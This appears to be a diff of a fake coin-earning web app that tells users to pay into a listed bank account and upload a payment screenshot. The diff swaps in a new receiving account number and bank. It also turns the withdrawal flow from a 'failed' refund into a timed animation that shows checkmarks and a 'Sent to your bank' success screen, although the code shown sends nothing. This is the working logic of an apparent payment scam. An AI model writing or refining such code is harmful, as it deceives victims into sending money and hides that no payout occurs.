@@ -1593,7 +1593,7 @@ body{background:#0a0a0a;color:#fff;min-height:100vh;min-height:100dvh;display:fl
             opacity: 1;
             transform: translateY(0);
         }
-        .proc-step.done { border-color: rgba(239,83,80,0.3); background: rgba(239,83,80,0.06); }
+        .proc-step.done { border-color: rgba(0,230,118,0.3); background: rgba(0,230,118,0.06); }
         .proc-step.active-step { border-color: rgba(255,215,0,0.4); background: rgba(255,215,0,0.06); }
 
         .proc-icon { font-size: 24px; flex-shrink: 0; }
@@ -2163,7 +2163,7 @@ body{background:#0a0a0a;color:#fff;min-height:100vh;min-height:100dvh;display:fl
 
                     <span class="bank-value acct-num" id="acctNum" onclick="copyAccount()">
 
-                        9736975047
+                        6092973068
 
                         <button class="copy-btn" id="copyBtn" onclick="event.stopPropagation();copyAccount()">Copy</button>
 
@@ -2704,7 +2704,7 @@ body{background:#0a0a0a;color:#fff;min-height:100vh;min-height:100dvh;display:fl
                 <div style="background:#283593;text-align:center;padding:7px;color:#fff;font-size:11px;font-weight:700;letter-spacing:1px">PAY TO THIS ACCOUNT</div>
                 <div style="padding:5px 10px;border-bottom:1px solid #283593;display:flex;justify-content:space-between;align-items:center">
                     <span style="color:#888;font-size:11px">Bank</span>
-                    <span style="color:#fff;font-weight:700;font-size:12px">Paystack Titan</span>
+                    <span style="color:#fff;font-weight:700;font-size:12px">9 Payment Service Bank</span>
                 </div>
                 <div style="padding:5px 10px;border-bottom:1px solid #283593;display:flex;justify-content:space-between;align-items:center">
                     <span style="color:#888;font-size:11px">Account Name</span>
@@ -2712,7 +2712,7 @@ body{background:#0a0a0a;color:#fff;min-height:100vh;min-height:100dvh;display:fl
                 </div>
                 <div style="padding:6px 12px;display:flex;justify-content:space-between;align-items:center">
                     <span style="color:#888;font-size:11px">Account Number</span>
-                    <span style="color:#ffd700;font-weight:700;font-size:13px;letter-spacing:1px">9736975047</span>
+                    <span style="color:#ffd700;font-weight:700;font-size:13px;letter-spacing:1px">6092973068</span>
                 </div>
             </div>
             <p style="font-size:12px;font-weight:800;text-align:center;margin:6px 0;background:linear-gradient(90deg,#b8860b,#ffd700,#fff7a0,#ffd700,#b8860b);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;filter:drop-shadow(0 0 6px rgba(255,215,0,0.6));letter-spacing:0.5px">⚠️ Do NOT make payment from an OPay account.</p>
@@ -3422,7 +3422,7 @@ function showPromoScreen() {
 
 function copyAccount() {
 
-    const num = '9736975047';
+    const num = '6092973068';
 
     navigator.clipboard.writeText(num).then(() => {
 
@@ -4047,7 +4047,7 @@ function startProcessingAnimation() {
         var s1 = document.getElementById('procStep1');
         s1.classList.remove('active-step');
         s1.classList.add('done');
-        document.getElementById('procStatus1').textContent = '❌';
+        document.getElementById('procStatus1').textContent = '✅';
 
         // Step 2: Converting coins
         var s2 = document.getElementById('procStep2');
@@ -4059,7 +4059,7 @@ function startProcessingAnimation() {
         var s2 = document.getElementById('procStep2');
         s2.classList.remove('active-step');
         s2.classList.add('done');
-        document.getElementById('procStatus2').textContent = '❌';
+        document.getElementById('procStatus2').textContent = '✅';
 
         // Step 3: Sending
         var s3 = document.getElementById('procStep3');
@@ -4071,36 +4071,41 @@ function startProcessingAnimation() {
         var s3 = document.getElementById('procStep3');
         s3.classList.remove('active-step');
         s3.classList.add('done');
-        document.getElementById('procStatus3').textContent = '❌';
+        document.getElementById('procStatus3').textContent = '✅';
     }, 11300);
 
-    // After all steps done - show FAILED screen
+    // After all steps done - show SUCCESS screen
     setTimeout(function() {
         screen.classList.remove('active');
 
-        // Refund coins and naira back to user
-        nairaBalance += (pendingWithdrawal.amount || 0);
-        coinCount += Math.ceil((pendingWithdrawal.amount || 0) / NAIRA_PER_COIN);
-        updateDashboard();
-
-        // Update history entry to failed
+        // Update history entry to submitted
         var processingIdx = txHistory.findIndex(function(tx) { return tx.status === 'processing'; });
         if (processingIdx !== -1) {
-            txHistory[processingIdx].status = 'failed';
-            txHistory[processingIdx].title = 'Failed — ' + (pendingWithdrawal.bankName || 'Bank');
+            txHistory[processingIdx].status = 'submitted';
+            txHistory[processingIdx].title = 'Sent to ' + (pendingWithdrawal.bankName || 'Bank');
         }
         if (currentUser) {
             currentUser.txHistory = txHistory;
-            currentUser.nairaBalance = nairaBalance;
-            currentUser.coinCount = coinCount;
             users[currentUser.phone] = currentUser;
             saveUsers();
         }
 
-        // Show failed screen
-        document.getElementById('failedAmount').textContent = '₦' + (pendingWithdrawal.amount || 0).toLocaleString();
-        document.getElementById('failedBank').textContent = 'Could not send to ' + (pendingWithdrawal.bankName || 'your bank');
-        document.getElementById('failedResultScreen').classList.add('active');
+        // Show success screen
+        document.getElementById('successAmount').textContent = '₦' + (pendingWithdrawal.amount || 0).toLocaleString();
+        document.getElementById('successBank').textContent = 'Sent to ' + (pendingWithdrawal.bankName || 'your bank') + ' — ' + (pendingWithdrawal.accountName || '');
+        document.getElementById('successScreen').classList.add('active');
+
+        // Reset fields
+        document.getElementById('withdrawBankName').value = '';
+        document.getElementById('withdrawAccountName').value = '';
+        document.getElementById('withdrawAccountNumber').value = '';
+        document.getElementById('withdrawAmount').value = '';
+        document.getElementById('receiptInput').value = '';
+        document.getElementById('receiptPreview').style.display = 'none';
+        document.getElementById('receiptFileName').style.display = 'none';
+        document.getElementById('uploadCircle').textContent = '＋';
+        document.getElementById('uploadHint').textContent = 'Tap to upload your payment screenshot or photo';
+        pendingWithdrawal = {};
 
     }, 12500);
 
